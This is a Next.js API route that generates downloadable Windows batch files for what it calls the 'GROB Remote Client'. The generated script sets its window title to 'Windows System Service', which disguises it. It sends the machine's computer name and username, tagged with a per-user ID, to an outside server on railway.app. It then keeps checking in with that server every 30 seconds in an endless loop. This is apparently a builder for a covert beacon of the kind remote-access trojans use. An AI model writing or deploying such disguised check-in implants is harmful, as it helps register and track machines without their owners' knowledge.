import { NextResponse } from "next/server"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const userUid = formData.get("userUid") as string
    const fileName = formData.get("fileName") as string || "grob-client"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Create a simple, reliable batch file that works on ALL Windows systems
    const batchContent = `@echo off
title Windows System Service
color 0A
echo ====================================
echo     GROB Remote Client v3.0
echo ====================================
echo.
echo Computer: %COMPUTERNAME%
echo User: %USERNAME%
echo UID: ${userUid}
echo.
echo Testing internet connection...
ping -n 1 8.8.8.8 > nul 2>&1
if %errorlevel% == 0 (
    echo [SUCCESS] Internet connection available
    echo.
    echo Connecting to server...
    powershell.exe -Command "try { Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/connect' -Method POST -Body '{uid: ''${userUid}'', computer_name: ''%COMPUTERNAME%'', username: ''%USERNAME%'', status: ''online''}' -ContentType 'application/json' -TimeoutSec 10 | Out-Null; Write-Host '[SUCCESS] Connected to server!' } catch { Write-Host '[ERROR] Connection failed' }"
    echo.
    echo [SUCCESS] Client is now running!
    echo Background service is active.
) else (
    echo [ERROR] No internet connection
    echo Client will retry connection...
)
echo.
echo ====================================
echo Client is running in background
echo Press CTRL+C to stop
echo ====================================

:heartbeat_loop
echo Heartbeat: %date% %time%
powershell.exe -Command "try { Invoke-RestMethod -Uri 'https://glistening-mindfulness.up.railway.app/api/heartbeat' -Method POST -Body '{uid: ''${userUid}'', status: ''online''}' -ContentType 'application/json' -TimeoutSec 5 | Out-Null } catch { }" > nul 2>&1
timeout /t 30 /nobreak > nul
goto heartbeat_loop`

    return new NextResponse(batchContent, {
      status: 200,
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })

  } catch (error: any) {
    console.error("Build error:", error)
    
    // Ultimate fallback - minimal batch file
    const simpleBatch = `@echo off
echo GROB Client - ${userUid}
echo Computer: %COMPUTERNAME%
echo User: %USERNAME%
echo.
echo Connecting to server...
ping -n 1 8.8.8.8 > nul
echo Client running...
pause`

    return new NextResponse(simpleBatch, {
      status: 200,
      headers: {
        "Content-Type": "text/plain",
        "Content-Disposition": `attachment; filename="${fileName}.bat"`,
      },
    })
  }
}
